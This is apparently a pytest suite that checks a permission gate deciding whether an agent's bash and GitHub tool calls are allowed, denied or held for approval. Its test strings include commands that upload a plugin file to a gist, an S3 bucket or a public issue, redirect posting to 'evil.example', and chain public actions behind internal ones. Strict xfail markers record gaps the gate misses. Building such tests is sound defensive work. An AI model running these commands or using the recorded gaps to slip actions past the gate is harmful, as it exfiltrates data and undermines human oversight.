"""Open posting/target acceptance contracts, with no execution or outbound calls.

Strict xfails identify reproduced gaps on main 64bfee2c. They are not fixes or
permission changes; future implementations must remove markers that XPASS.
"""
from __future__ import annotations

import asyncio
from typing import NamedTuple

import pytest

from exo import crypto, gate
from exo_gate import hook


class Case(NamedTuple):
    issue: int
    name: str
    action: dict
    policy: dict
    expected: str
    violation: str = ""


def shell(command: str) -> dict:
    return {"tool": "bash", "args": {"command": command}}


INTERNAL = {"scopes": {"internal": ["myorg/*"]}}
POSTING = {"footer": "F", "forbid_words": ["Zork"]}
POLICY = {"gates": INTERNAL, "posting": POSTING}
DESTINATION_DENY = {"gates": {**INTERNAL, "deny": ["target:pub/*"]}}
MATRIX = {"gates": {"matrix": {"irreversible": {x: "deny" for x in ("internal", "private", "public")}},
                     "rules": [{"match": {"command": "^git push"}, "decision": "allow"}]}}
PUSH = "git push --force origin main"
STORE = "~/.exo/plugins/foo/__init__.py"

CASES = [
    Case(437, "internal_then_public_comment", shell("gh pr comment 5 -R myorg/app --body $'ok\\nF' && gh pr comment 6 -R other/repo --body $'fine\\nF'"),
         POLICY, "ask"),
    Case(437, "internal_then_public_close", shell("gh pr comment 5 -R myorg/app --body $'ok\\nF' && gh issue close 9 -R other/repo"),
         POLICY, "ask"),
    Case(437, "internal_then_public_semicolon", shell("gh pr comment 5 -R myorg/app --body $'ok\\nF'; gh pr comment 6 -R pub/repo --body $'fine\\nF'"),
         POLICY, "ask"),
    Case(449, "transfer_destination_operand", shell("gh issue transfer 5 pub/other -R myorg/app"),
         DESTINATION_DENY, "deny"),
    Case(449, "transfer_destination_with_issue_url", shell("gh issue transfer https://github.com/myorg/app/issues/5 pub/other"),
         DESTINATION_DENY, "deny"),
    Case(472, "public_merge_subject_scrub", shell("gh pr merge 5 -R other/pub --squash --subject 'see /home/alice/notes'"),
         POLICY, "ask", "home path"),
    Case(472, "public_merge_body_scrub", shell("gh pr merge 5 -R other/pub --squash --body $'see /home/alice/notes\\nF'"),
         POLICY, "ask", "home path"),
    Case(472, "api_merge_commit_title", shell("gh api -X PUT repos/myorg/app/pulls/5/merge -f commit_title='Zork leaked'"),
         POLICY, "ask", "forbidden word: Zork"),
    Case(472, "api_merge_commit_message", shell("gh api -X PUT repos/myorg/app/pulls/5/merge -f commit_message='Zork leaked'"),
         POLICY, "ask", "forbidden word: Zork"),
    Case(472, "api_repo_merge_commit_message", shell("gh api repos/myorg/app/merges -f base=main -f head=x -f commit_message='Zork leaked'"),
         POLICY, "ask", "forbidden word: Zork"),
    Case(472, "mcp_merge_commit_text", {"tool": "mcp__github__merge_pull_request", "args": {
        "owner": "myorg", "repo": "app", "pull_number": 5,
        "commit_title": "Zork leaked", "commit_message": "Zork leaked"}}, POLICY, "ask", "forbidden word: Zork"),
    Case(547, "store_gist_does_not_lower_matrix_deny", shell(PUSH + " && gh gist create " + STORE), MATRIX, "deny"),
    Case(547, "store_s3_does_not_lower_matrix_deny", shell(PUSH + " && aws s3 cp " + STORE + " s3://b/x"), MATRIX, "deny"),
    Case(547, "store_issue_does_not_lower_matrix_deny", shell(PUSH + " && gh issue create -R pub/repo -t x -F " + STORE), MATRIX, "deny"),
    Case(566, "gh_host_destination", shell("GH_HOST=evil.example gh pr comment 5 -R myorg/app --body F"),
         {"gates": {**INTERNAL, "deny": ["target:evil.example/*"]}, "posting": POSTING}, "deny"),
    Case(566, "gh_repo_destination", shell("GH_REPO=pub/repo gh pr comment 5 --body F"),
         {"gates": {**INTERNAL, "categories": {"github_post": "allow"}, "deny": ["target:pub/*"]}, "posting": POSTING}, "deny"),
    Case(566, "exported_gh_repo_destination", shell("export GH_REPO=pub/repo; gh pr comment 5 --body F"),
         {"gates": {**INTERNAL, "categories": {"github_post": "allow"}, "deny": ["target:pub/*"]}, "posting": POSTING}, "deny"),
    Case(566, "gh_config_directory_changes_execution", shell("GH_CONFIG_DIR=/tmp/ghcfg gh pr comment 5 -R myorg/app --body F"),
         {"gates": {**INTERNAL, "categories": {"github_post": "allow"}}, "posting": POSTING}, "ask"),
]

KNOWN_GAPS = {
    "internal_then_public_comment", "internal_then_public_close", "internal_then_public_semicolon",
    "transfer_destination_operand", "transfer_destination_with_issue_url", "public_merge_subject_scrub",
    "public_merge_body_scrub", "api_merge_commit_title", "api_merge_commit_message",
    "api_repo_merge_commit_message", "mcp_merge_commit_text",
    # #547 (store line lift keeps its own text) is fixed: its three store_* cases pass and carry no marker.
    "gh_host_destination",
    # #566's GH_REPO and GH_CONFIG_DIR rows are fixed: they pass and carry no marker.
}


def inspect(action: dict, policy: dict):
    return gate.decide(gate.classify(action), gate.normalize_policies(policy))


@pytest.mark.parametrize("case", [
    pytest.param(case, id=f"{case.issue}-{case.name}", marks=(
        pytest.mark.xfail(strict=True, reason=f"Open #{case.issue}: reproduced on main 64bfee2c")
        if case.name in KNOWN_GAPS else ())) for case in CASES
])
def test_open_posting_issue_acceptance(case):
    result = inspect(case.action, case.policy)
    assert result.outcome == case.expected, result
    if case.violation:
        assert any(case.violation in item for item in result.violations), result


@pytest.mark.parametrize("command,needle", [
    ("gh pr comment 5 -R other/pub --body $'see /home/alice/notes\\nF'", "home path"),
    ("gh api repos/myorg/app/issues/5/comments -f body='Zork leaked'", "forbidden word: Zork"),
])
def test_existing_outbound_text_checks_remain_active(command, needle):
    result = inspect(shell(command), POLICY)
    assert result.outcome == "ask", result
    assert any(needle in item for item in result.violations), result


def test_explicit_rule_still_allows_its_standalone_push():
    assert inspect(shell(PUSH), MATRIX).outcome == "allow"


class Context:
    def __init__(self, settings):
        self.settings, self.hooks = settings, {}

    def get_config(self, key, default=None):
        return self.settings.get(key, default)

    def register_hook(self, name, callback):
        self.hooks.setdefault(name, []).append(callback)


def skipped_file_card(tmp_path, kind):
    store = tmp_path / "store"
    (store / "policies").mkdir(parents=True)
    (store / "policies" / "gates.yaml").write_text("categories: {github_post: allow}\n")
    key = tmp_path / "gate.key"
    crypto.save_key(crypto.keygen(), key)
    context = Context({"principal_store": str(store), "key_path": str(key), "decision_model": False})
    hook.register(context)
    path = "/dev/stdin"
    if kind == "large":
        body = tmp_path / "large.md"
        body.write_text("x" * (300 * 1024))
        path = str(body)
    [pre] = context.hooks["pre_tool_call"]
    return asyncio.run(pre(tool_name="terminal", args={"command":
        f"gh pr comment 5 -R myorg/app --body-file {path}"}, session_id="s1", tool_call_id="c1", turn_id="t1"))


@pytest.mark.xfail(strict=True, reason="Open #567: skipped absolute files still get the generic absolute-path hint")
@pytest.mark.parametrize("kind,reason_words", [("large", ("256", "too large", "size limit")),
                                               ("process", ("process", "descriptor"))])
def test_skipped_absolute_body_file_explains_its_actual_limit(tmp_path, kind, reason_words):
    card = skipped_file_card(tmp_path, kind)
    message = card["message"].lower()
    assert "absolute --body-file path" not in message, message
    assert any(word in message for word in reason_words), message


@pytest.mark.parametrize("kind", ["large", "process"])
def test_skipped_body_file_keeps_its_once_only_approval(tmp_path, kind):
    card = skipped_file_card(tmp_path, kind)
    assert card["action"] == "approve" and card["once"] is True, card


def test_437_all_internal_compound_stays_log():
    line = "gh pr comment 5 -R myorg/app --body $'ok\\nF' && gh pr comment 6 -R myorg/other --body $'fine\\nF'"
    assert inspect(shell(line), POLICY).outcome == "log"


@pytest.mark.parametrize("line", ["gh pr comment 6 -R other/repo --body $'fine\\nF'",
                                   "gh issue close 9 -R other/repo"])
def test_437_standalone_public_operations_stay_ask(line):
    assert inspect(shell(line), POLICY).outcome == "ask"
